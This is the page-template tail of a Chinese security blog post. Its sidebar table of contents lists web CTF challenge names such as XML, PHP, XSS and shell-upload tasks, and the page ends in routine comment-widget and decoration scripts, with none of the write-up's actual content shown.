href="/2019/12/12/2019-12-12-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E4%B9%8BNTLM/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Windows认证机制之NTLM</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2019/11/02/2019-11-02-%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"><span class="paginator-prev__text">第五届上海市大学生网络安全大赛部分WriteUp</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="valine-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fake-XML-cookbook"><span class="toc-number">2.</span> <span class="toc-text">
          Fake XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#True-XML-cookbook"><span class="toc-number">3.</span> <span class="toc-text">
          True XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyphp"><span class="toc-number">4.</span> <span class="toc-text">
          easyphp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#replace"><span class="toc-number">5.</span> <span class="toc-text">
          replace</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Upload-your-Shell"><span class="toc-number">6.</span> <span class="toc-text">
          Upload your Shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hacker-backdoor"><span class="toc-number">7.</span> <span class="toc-text">
          hacker_backdoor</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#simple-xss"><span class="toc-number">8.</span> <span class="toc-text">
          simple_xss</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flask"><span class="toc-number">9.</span> <span class="toc-text">
          flask</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phar-matches-everything"><span class="toc-number">10.</span> <span class="toc-text">
          phar matches everything</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/author/author.png" alt="avatar"></div><p class="sidebar-ov-author__text">7TEN7</p></div><div class="sidebar-ov-feed"><span class="sidebar-ov-feed-rss"><a class="sidebar-ov-feed-rss__link" href="/atom.xml" target="_blank" rel="noopener"><span class="sidebar-ov-feed-rss__icon"><i class="fas fa-rss"></i></span><span>RSS 订阅</span></a></span></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">55</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">32</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__devider"></span><span>7TEN7</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="255,255,255" opacity="1" count="200" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/lazyload@2.0.0-rc.2/lazyload.min.js"></script><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function loadValine () {
  var GUEST_INFO = ['nick', 'mail', 'link'];
  var guest_info = 'nick,mail,link';

  guest_info = guest_info.split(',').filter(function(item) {
    return GUEST_INFO.indexOf(item) > -1;
  });
  new Valine({
    el: '#valine-container',
    appId: 'Nzl7LsK4moQuOsIfeWfbc8Rz-gzGzoHsz',
    appKey: '5xmoJuWrMWHpI7pwtJviyIh6',
    notify: true,
    verify: true,
    placeholder: 'Just go go',
    avatar: 'mp',
    meta: guest_info,
    pageSize: '10' || 10,
    visitor: false,
    recordIP: true,
    lang: '' || 'zh-cn',
    path: window.location.pathname
  });
}

if (false) {
  loadValine();
} else {
  window.addEventListener('DOMContentLoaded', loadValine, false);
}</script><script src="/js/utils.js?v=2.5.0"></script><script src="/js/stun-boot.js?v=2.5.0"></script><script src="/js/scroll.js?v=2.5.0"></script><script src="/js/header.js?v=2.5.0"></script><script src="/js/sidebar.js?v=2.5.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/shizuku.model.json"},"display":{"position":"right","width":260,"height":380,"vOffset":5},"mobile":{"show":true},"log":false});</script></body></html>